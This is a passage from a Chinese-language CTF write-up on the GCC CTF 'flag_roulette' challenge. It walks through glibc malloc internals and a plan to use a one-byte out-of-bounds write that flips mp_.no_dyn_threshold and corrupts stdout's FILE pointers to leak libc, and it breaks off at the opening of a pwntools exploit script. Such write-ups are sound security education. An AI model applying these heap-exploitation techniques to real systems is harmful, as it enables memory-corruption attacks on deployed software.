  <span class="p">.</span><span class="n">mmap_threshold</span> <span class="o">=</span> <span class="n">DEFAULT_MMAP_THRESHOLD</span><span class="p">,</span>
  <span class="p">.</span><span class="n">trim_threshold</span> <span class="o">=</span> <span class="n">DEFAULT_TRIM_THRESHOLD</span><span class="p">,</span>
<span class="cp">#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))
</span>  <span class="p">.</span><span class="n">arena_test</span> <span class="o">=</span> <span class="n">NARENAS_FROM_NCORES</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="cp">#if USE_TCACHE
</span>  <span class="p">,</span>
  <span class="p">.</span><span class="n">tcache_count</span> <span class="o">=</span> <span class="n">TCACHE_FILL_COUNT</span><span class="p">,</span>
  <span class="p">.</span><span class="n">tcache_bins</span> <span class="o">=</span> <span class="n">TCACHE_MAX_BINS</span><span class="p">,</span>
  <span class="p">.</span><span class="n">tcache_max_bytes</span> <span class="o">=</span> <span class="n">tidx2usize</span> <span class="p">(</span><span class="n">TCACHE_MAX_BINS</span><span class="o">-</span><span class="mi">1</span><span class="p">),</span>
  <span class="p">.</span><span class="n">tcache_unsorted_limit</span> <span class="o">=</span> <span class="mi">0</span> <span class="cm">/* No limit.  */</span>
<span class="cp">#endif
</span><span class="p">};</span>

<span class="err">······</span>

<span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">sysmalloc</span> <span class="p">(</span><span class="n">INTERNAL_SIZE_T</span> <span class="n">nb</span><span class="p">,</span> <span class="n">mstate</span> <span class="n">av</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">mchunkptr</span> <span class="n">old_top</span><span class="p">;</span>              <span class="cm">/* incoming value of av-&gt;top */</span>
  <span class="n">INTERNAL_SIZE_T</span> <span class="n">old_size</span><span class="p">;</span>       <span class="cm">/* its size */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">old_end</span><span class="p">;</span>                  <span class="cm">/* its end address */</span>

  <span class="kt">long</span> <span class="n">size</span><span class="p">;</span>                      <span class="cm">/* arg to first MORECORE or mmap call */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">brk</span><span class="p">;</span>                      <span class="cm">/* return value from MORECORE */</span>

  <span class="kt">long</span> <span class="n">correction</span><span class="p">;</span>                <span class="cm">/* arg to 2nd MORECORE call */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">snd_brk</span><span class="p">;</span>                  <span class="cm">/* 2nd return val */</span>

  <span class="n">INTERNAL_SIZE_T</span> <span class="n">front_misalign</span><span class="p">;</span> <span class="cm">/* unusable bytes at front of new space */</span>
  <span class="n">INTERNAL_SIZE_T</span> <span class="n">end_misalign</span><span class="p">;</span>   <span class="cm">/* partial page left at end of new space */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">aligned_brk</span><span class="p">;</span>              <span class="cm">/* aligned offset into brk */</span>

  <span class="n">mchunkptr</span> <span class="n">p</span><span class="p">;</span>                    <span class="cm">/* the allocated/returned chunk */</span>
  <span class="n">mchunkptr</span> <span class="n">remainder</span><span class="p">;</span>            <span class="cm">/* remainder from allocation */</span>
  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">remainder_size</span><span class="p">;</span>   <span class="cm">/* its size */</span>


  <span class="kt">size_t</span> <span class="n">pagesize</span> <span class="o">=</span> <span class="n">GLRO</span> <span class="p">(</span><span class="n">dl_pagesize</span><span class="p">);</span>
  <span class="n">bool</span> <span class="n">tried_mmap</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>


  <span class="cm">/*
     If have mmap, and the request size meets the mmap threshold, and
     the system supports mmap, and there are few enough currently
     allocated mmapped regions, try to directly map this request
     rather than expanding top.
   */</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">==</span> <span class="nb">NULL</span>
      <span class="o">||</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">mp_</span><span class="p">.</span><span class="n">mmap_threshold</span><span class="p">)</span> <span class="c1">// 这里 判断是否 大于等于 0x20000</span>
	  <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">mp_</span><span class="p">.</span><span class="n">n_mmaps</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">n_mmaps_max</span><span class="p">)))</span>
    <span class="p">{</span>
      <span class="kt">char</span> <span class="o">*</span><span class="n">mm</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">mp_</span><span class="p">.</span><span class="n">hp_pagesize</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">nb</span> <span class="o">&gt;=</span> <span class="n">mp_</span><span class="p">.</span><span class="n">hp_pagesize</span><span class="p">)</span>
	    <span class="p">{</span>
	      <span class="cm">/* There is no need to issue the THP madvise call if Huge Pages are
	         used directly.  */</span>
	      <span class="n">mm</span> <span class="o">=</span> <span class="n">sysmalloc_mmap</span> <span class="p">(</span><span class="n">nb</span><span class="p">,</span> <span class="n">mp_</span><span class="p">.</span><span class="n">hp_pagesize</span><span class="p">,</span> <span class="n">mp_</span><span class="p">.</span><span class="n">hp_flags</span><span class="p">,</span> <span class="n">av</span><span class="p">);</span>
	      <span class="k">if</span> <span class="p">(</span><span class="n">mm</span> <span class="o">!=</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
	        <span class="k">return</span> <span class="n">mm</span><span class="p">;</span>
	    <span class="p">}</span>
      <span class="n">mm</span> <span class="o">=</span> <span class="n">sysmalloc_mmap</span> <span class="p">(</span><span class="n">nb</span><span class="p">,</span> <span class="n">pagesize</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">av</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">mm</span> <span class="o">!=</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">mm</span><span class="p">;</span>
      <span class="n">tried_mmap</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
    <span class="p">}</span>
<span class="err">······</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>一个错误： 第一次可以正常 <code class="language-plaintext highlighter-rouge">malloc(0x21000)</code>​ ,如果 <code class="language-plaintext highlighter-rouge">free</code>​ 后再次 <code class="language-plaintext highlighter-rouge">malloc(0x21000)</code>​ 就会报错</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="nb">read</span><span class="o">(</span>0, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
write<span class="o">(</span>1, <span class="s2">"How many bytes would you like to"</span>..., 41How many bytes would you like to bet on ?<span class="o">)</span> <span class="o">=</span> 41
write<span class="o">(</span>1, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 1                                                                                                                                                                                                        <span class="o">)</span>                       <span class="o">=</span> 1
write<span class="o">(</span>1, <span class="s2">"&gt; "</span>, 2&gt; <span class="o">)</span>                       <span class="o">=</span> 2
<span class="nb">read</span><span class="o">(</span>0, 131056 <span class="c"># 第二次申请 0x1fff0</span>
<span class="s2">"1"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"3"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"1"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"0"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"5"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"6"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
brk<span class="o">(</span>0x583868910000<span class="o">)</span>                     <span class="o">=</span> 0xc
+++ killed by SIGSYS <span class="o">(</span>core dumped<span class="o">)</span> +++
<span class="o">[</span>1]    40569 invalid system call <span class="o">(</span>core dumped<span class="o">)</span>  strace ./flag_roulette
</pre></td></tr></tbody></table></code></div></div>

<p>为了深入了解为什么会发生这种情况，我们研究了如何  <code class="language-plaintext highlighter-rouge">free</code>​ 工作并发现了一些有趣的东西。当您释放分配的块时  <code class="language-plaintext highlighter-rouge">mmap</code>​，它会更改  <code class="language-plaintext highlighter-rouge">mp_.mmap_threshold</code>​ 到您刚刚释放的块的大小。那么，我们的下一个  <code class="language-plaintext highlighter-rouge">malloc(0x21000)</code>​ 没用  <code class="language-plaintext highlighter-rouge">mmap</code>​ 因为，根据新的门槛，  <code class="language-plaintext highlighter-rouge">0x21000</code>​ 不够大。</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre><span class="kt">void</span>
<span class="nf">__libc_free</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">mem</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">chunk_is_mmapped</span> <span class="p">(</span><span class="n">p</span><span class="p">))</span>                       <span class="cm">/* release mmapped memory. */</span>
    <span class="p">{</span>
      <span class="cm">/* See if the dynamic brk/mmap threshold needs adjusting.
	 Dumped fake mmapped chunks do not affect the threshold.  */</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">mp_</span><span class="p">.</span><span class="n">no_dyn_threshold</span>
          <span class="o">&amp;&amp;</span> <span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">mmap_threshold</span>
          <span class="o">&amp;&amp;</span> <span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">DEFAULT_MMAP_THRESHOLD_MAX</span><span class="p">)</span>
        <span class="p">{</span>
          <span class="n">mp_</span><span class="p">.</span><span class="n">mmap_threshold</span> <span class="o">=</span> <span class="n">chunksize</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
          <span class="n">mp_</span><span class="p">.</span><span class="n">trim_threshold</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">mp_</span><span class="p">.</span><span class="n">mmap_threshold</span><span class="p">;</span>
          <span class="n">LIBC_PROBE</span> <span class="p">(</span><span class="n">memory_mallopt_free_dyn_thresholds</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span>
                      <span class="n">mp_</span><span class="p">.</span><span class="n">mmap_threshold</span><span class="p">,</span> <span class="n">mp_</span><span class="p">.</span><span class="n">trim_threshold</span><span class="p">);</span>
        <span class="p">}</span>
      <span class="n">munmap_chunk</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">...</span>
<span class="p">}</span>

</pre></td></tr></tbody></table></code></div></div>

<p>为了解决这个问题，我们需要一个好的策略。我们注意到了  <code class="language-plaintext highlighter-rouge">__libc_free</code>​ 功能：它只会改变  <code class="language-plaintext highlighter-rouge">mp_.mmap_threshold</code>​ 如果  <code class="language-plaintext highlighter-rouge">mp_.no_dyn_threshold</code>​ 为 0 （false）。 <strong>从我们分配块时开始，我们仍然具有一个字节</strong> 越界 （OOB） 写入功能，并且此偏移量从  <code class="language-plaintext highlighter-rouge">libc</code>​ 区域不会改变。这意味着我们可以调整  <code class="language-plaintext highlighter-rouge">mp_.no_dyn_threshold</code>​ 设置为 1 （true）。这样做意味着当我们释放块时，阈值不会改变，从而允许我们对  <code class="language-plaintext highlighter-rouge">tls</code>​ 和  <code class="language-plaintext highlighter-rouge">libc</code>​ 我们想要的区域。这之所以有效，是因为我们的  <code class="language-plaintext highlighter-rouge">malloc(0x21000)</code>​ 将始终使用  <code class="language-plaintext highlighter-rouge">mmap</code>​，将块放在  <code class="language-plaintext highlighter-rouge">tls</code>​ 和  <code class="language-plaintext highlighter-rouge">libc</code>​ 地区。</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240309175808-wyzewhp.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240309175808-wyzewhp.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="mp_-分析"><span class="me-2">mp_ 分析</span><a href="#mp_-分析" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>先来研究一下这个东西</li>
</ul>

<blockquote>
  <p>当您释放分配的块时  <code class="language-plaintext highlighter-rouge">mmap</code>​，它会更改  <code class="language-plaintext highlighter-rouge">mp_.mmap_threshold</code>​。那么，我们的下一个  <code class="language-plaintext highlighter-rouge">malloc(0x21000)</code>​ 没用  <code class="language-plaintext highlighter-rouge">mmap</code>​ 因为，根据新的门槛，  <code class="language-plaintext highlighter-rouge">0x21000</code>​ 不够大。</p>
</blockquote>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>


<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">ptr1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x21000</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">ptr1</span><span class="p">);</span>

    <span class="n">free</span><span class="p">(</span><span class="n">ptr1</span><span class="p">);</span> <span class="c1">// 它会更改  `mp_.mmap_threshold` 加上刚释放的块的大小</span>

    <span class="kt">char</span> <span class="o">*</span> <span class="n">ptr2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x21000</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">ptr2</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>第一次申请 0x21000,  <code class="language-plaintext highlighter-rouge">trim_threshold</code>​ 是 0x20000</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310155550-ek0fas6.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310155550-ek0fas6.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>然后释放, 可以看到 释放 mmap 分配的chunk 时，它会更改  <code class="language-plaintext highlighter-rouge">mp_.mmap_threshold</code>​ ，使它变得更大</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">mp_</span><span class="p">.</span><span class="n">no_dyn_threshold</span> <span class="c1">// 默认是 0， 如果我们把它改成1 是不是就不会执行到 改mp_.trim_threshold 的语句了</span>
          <span class="o">&amp;&amp;</span> <span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">mmap_threshold</span>
          <span class="o">&amp;&amp;</span> <span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">DEFAULT_MMAP_THRESHOLD_MAX</span><span class="p">)</span>
        <span class="p">{</span>
          <span class="n">mp_</span><span class="p">.</span><span class="n">mmap_threshold</span> <span class="o">=</span> <span class="n">chunksize</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
          <span class="n">mp_</span><span class="p">.</span><span class="n">trim_threshold</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">mp_</span><span class="p">.</span><span class="n">mmap_threshold</span><span class="p">;</span> <span class="c1">// 这里 mmap_threshold = 0x22000</span>
          <span class="n">LIBC_PROBE</span> <span class="p">(</span><span class="n">memory_mallopt_free_dyn_thresholds</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span>
                      <span class="n">mp_</span><span class="p">.</span><span class="n">mmap_threshold</span><span class="p">,</span> <span class="n">mp_</span><span class="p">.</span><span class="n">trim_threshold</span><span class="p">);</span>
        <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310155745-096mcvp.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310155745-096mcvp.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310155815-v3ga1s2.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310155815-v3ga1s2.png" alt="image" loading="lazy"></a>​</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="n">mp_</span>
<span class="err">$</span><span class="mi">4</span> <span class="o">=</span> <span class="p">{</span>
  <span class="n">trim_threshold</span> <span class="o">=</span> <span class="mi">278528</span><span class="p">,</span>
  <span class="n">top_pad</span> <span class="o">=</span> <span class="mi">131072</span><span class="p">,</span>
  <span class="n">mmap_threshold</span> <span class="o">=</span> <span class="mi">139264</span><span class="p">,</span>
  <span class="n">arena_test</span> <span class="o">=</span> <span class="mi">8</span><span class="p">,</span>
  <span class="n">arena_max</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">thp_pagesize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">hp_pagesize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">hp_flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">n_mmaps</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">n_mmaps_max</span> <span class="o">=</span> <span class="mi">65536</span><span class="p">,</span>
  <span class="n">max_n_mmaps</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
  <span class="n">no_dyn_threshold</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">mmapped_mem</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">max_mmapped_mem</span> <span class="o">=</span> <span class="mi">139264</span><span class="p">,</span>
  <span class="n">sbrk_base</span> <span class="o">=</span> <span class="mh">0x555555559000</span> <span class="sh">""</span><span class="p">,</span>
  <span class="n">tcache_bins</span> <span class="o">=</span> <span class="mi">64</span><span class="p">,</span>
  <span class="n">tcache_max_bytes</span> <span class="o">=</span> <span class="mi">1032</span><span class="p">,</span>
  <span class="n">tcache_count</span> <span class="o">=</span> <span class="mi">7</span><span class="p">,</span>
  <span class="n">tcache_unsorted_limit</span> <span class="o">=</span> <span class="mi">0</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>再次申请 0x21000 返回的地址 就是 heap 上的了</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310160032-ut31i5y.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310160032-ut31i5y.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="分析攻击思路"><span class="me-2">分析攻击思路</span><a href="#分析攻击思路" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ul>
  <li>首先申请一个big chunk (0x2000), malloc 会使用 mmap 来分配内存位置（tls 附近），每次申请完地址，我们可以改一个字节，利用 OOB 修改 <code class="language-plaintext highlighter-rouge">mp_.no_dyn_threshold</code>​​ 的值 不为空。</li>
  <li>这样的话 free 时，就不会 执行到 <code class="language-plaintext highlighter-rouge">mp_.trim_threshold = 2 * mp_.mmap_threshold;</code>​​ 避免被更改</li>
</ul>

<p>‍</p>

<p>‍</p>

<h3 id="exploit-change-mp_no_dyn_threshold"><span class="me-2">exploit-change-mp_.no_dyn_threshold</span><a href="#exploit-change-mp_no_dyn_threshold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>​<code class="language-plaintext highlighter-rouge">mp_.no_dyn_threshold</code>​ 还是比较好定位的（题目之给了 libc ld binary, 缺少一些符号表）</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nf">add</span><span class="p">(</span><span class="mh">0x21000</span><span class="p">,</span><span class="mi">2065304</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> 
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310162436-82i0rru.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310162436-82i0rru.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>修改后</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310162541-cfrhb1f.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310162541-cfrhb1f.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<blockquote>
  <p>接下来再 free ，然后再申请基本上不会再报错了</p>
</blockquote>

<p>‍</p>

<h3 id="exploit-libc_leak"><span class="me-2">exploit-libc_leak</span><a href="#exploit-libc_leak" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>
    <p>利用 OOB 修改 <code class="language-plaintext highlighter-rouge">_IO2_1_stdout_._IO_write_ptr</code>​ 的指向地址</p>
  </li>
  <li>
    <p>只要 <code class="language-plaintext highlighter-rouge">_IO_write_base</code>​​ 和 <code class="language-plaintext highlighter-rouge">_IO_write_ptr</code>​​ 有差距就会输出<code class="language-plaintext highlighter-rouge">_IO_write_base</code>​​ 到 <code class="language-plaintext highlighter-rouge">_IO_write_ptr</code>​​ 直接的数据</p>
  </li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
